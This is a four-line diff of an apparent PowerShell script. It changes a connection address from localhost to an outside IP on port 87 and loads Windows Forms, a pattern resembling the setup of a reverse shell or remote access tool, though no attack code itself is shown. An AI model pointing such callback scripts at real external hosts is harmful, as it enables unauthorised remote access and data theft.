@@ -1,4 +1,4 @@
-$daip = "localhost";
+$daip = "84.213.241.114";
 $daport = 87;
 $enc = [Text.Encoding]::UTF8
 Add-Type -AssemblyName System.Windows.Forms
